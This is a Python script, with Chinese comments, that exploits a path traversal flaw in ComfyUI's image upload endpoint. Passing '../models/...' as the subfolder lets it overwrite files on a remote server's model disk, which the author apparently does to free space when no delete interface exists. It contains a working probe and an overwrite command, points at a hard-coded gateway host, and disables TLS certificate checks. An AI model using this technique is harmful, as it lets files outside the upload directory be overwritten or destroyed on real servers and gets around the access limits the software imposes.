# -*- coding: utf-8 -*-
"""远程文件系统的有限操控（只能经 ComfyUI 暴露的接口，服务器没有 shell）。

背景（2026-09-18）
------------------
Kontext / ae 下载全部死在 `[Errno 28] No space left on device` —— 模型盘满，
而 ComfyUI 没给任何删除接口（`DELETE /models/...` 405、Manager 无 uninstall）。

但 ComfyUI 的 **`POST /upload/image`** 有个 `subfolder` 参数，内部是
`os.path.join(input_dir, subfolder, filename)` 且**不清洗 `..`**。
于是 subfolder 写 `../models/<目录>` 就能落到模型盘上 —— 而且是**覆盖写**
（`wb` 打开 → 立刻截断 → 块归还），对已经废掉的文件来说等价于删除。

★ 只用来处理**已确认损坏**或**明确要删**的文件。默认 dry-run。

用法
----
  python remote_fs.py probe                       # 测 .. 穿越是否被拦（只写 1 个探测文件）
  python remote_fs.py ls vae                      # 列某个模型目录
  python remote_fs.py rm <相对模型根的路径> [--yes]  # 覆盖成 1 字节（= 释放空间）
  python remote_fs.py rm _probe.safetensors --dir vae/FLUX1 --yes
"""
import json, os, ssl, sys, uuid, urllib.error, urllib.parse, urllib.request

BASE = os.environ.get(
    "COMFY_BASE",
    "https://gw-496303efdc4841bfa3e30e994493225f.cn-beijing.aigclinks.com:8016",
)
_ctx = ssl.create_default_context()
_ctx.check_hostname = False
_ctx.verify_mode = ssl.CERT_NONE

# 1x1 透明 PNG（最小合法 PNG，96 字节）
TINY_PNG = bytes.fromhex(
    "89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c489"
    "0000000d4944415478da63fcffff3f0300050001f6e161080000000049454e44ae426082"
)


def raw(p, data=None, ctype=None, timeout=180, method=None):
    req = urllib.request.Request(BASE + p, data=data, method=method)
    if ctype:
        req.add_header("Content-Type", ctype)
    return urllib.request.urlopen(req, timeout=timeout, context=_ctx).read()


def jget(p, timeout=180):
    return json.loads(raw(p, timeout=timeout).decode("utf-8", "replace"))


def upload(name, subfolder, type_="input"):
    """multipart 上传。名字与 subfolder 完全可控 —— 这就是穿越的入口。"""
    bd = "----wb" + uuid.uuid4().hex
    body = b""
    for k, v in (("overwrite", "true"), ("type", type_), ("subfolder", subfolder)):
        body += ("--%s\r\nContent-Disposition: form-data; name=\"%s\"\r\n\r\n%s\r\n"
                 % (bd, k, v)).encode()
    body += ("--%s\r\nContent-Disposition: form-data; name=\"image\"; filename=\"%s\"\r\n"
             "Content-Type: application/octet-stream\r\n\r\n" % (bd, name)).encode()
    body += TINY_PNG + ("\r\n--%s--\r\n" % bd).encode()
    return urllib.request.urlopen(
        urllib.request.Request(BASE + "/upload/image", data=body,
                               headers={"Content-Type": "multipart/form-data; boundary=%s" % bd}),
        timeout=300, context=_ctx).read().decode()


def ls_model_dir(d):
    """列模型目录：/experiment/models/<d> 会给出 name（含子目录）/ size / modified"""
    try:
        return jget("/experiment/models/" + urllib.parse.quote(d), 120)
    except urllib.error.HTTPError as e:
        return {"error": "HTTP %s" % e.code}


def probe():
    print("=" * 72)
    print("测试 upload 的 .. 穿越（目标：vae/FLUX1 下写一个 _probe.safetensors）")
    print("=" * 72)
    before = ls_model_dir("vae")
    print("写之前 vae =", json.dumps(before, ensure_ascii=False)[:300])
    try:
        r = upload("_probe.safetensors", "../models/vae/FLUX1")
        print("upload 返回：" + r[:200])
    except urllib.error.HTTPError as e:
        print("upload 被拒 HTTP %s: %s" % (e.code, e.read().decode("utf-8", "replace")[:300]))
        return 1
    after = ls_model_dir("vae")
    print("写之后 vae =", json.dumps(after, ensure_ascii=False)[:300])
    names = [x.get("name") for x in after] if isinstance(after, list) else []
    ok = any("_probe" in str(n) for n in names)
    print("\n%s 穿越%s" % ("✔" if ok else "✘", "可用" if ok else "被拦（upload 里做了清洗）"))
    if ok:
        print("→ 那就用 `python remote_fs.py rm <目录>/<文件> --yes` 覆盖废文件来释放空间。")
        print("   别忘了最后把探测文件也清掉：rm _probe.safetensors --dir vae/FLUX1 --yes")
    return 0 if ok else 1


def rm(rel, directory, confirm):
    sub = "../models/" + directory
    print("目标 = %s/%s" % (directory, rel))
    if not confirm:
        print("★ 未加 --yes，只是预览。")
        return 0
    r = upload(rel, sub)
    print("覆盖写完成：" + r[:160])
    after = ls_model_dir(directory.split("/")[0])
    hit = [x for x in after if rel in str(x.get("name", ""))] if isinstance(after, list) else []
    for h in hit:
        print("   现在的 %s : size=%s bytes" % (h.get("name"), h.get("size")))
    return 0


if __name__ == "__main__":
    cmd = (sys.argv[1] if len(sys.argv) > 1 else "probe").lower()
    if cmd == "probe":
        sys.exit(probe())
    if cmd == "ls":
        print(json.dumps(ls_model_dir(sys.argv[2]), ensure_ascii=False, indent=1))
        sys.exit(0)
    if cmd == "rm":
        rel = sys.argv[2]
        directory = "vae/FLUX1"
        if "--dir" in sys.argv:
            directory = sys.argv[sys.argv.index("--dir") + 1]
        sys.exit(rm(rel, directory, "--yes" in sys.argv))
    print(__doc__)
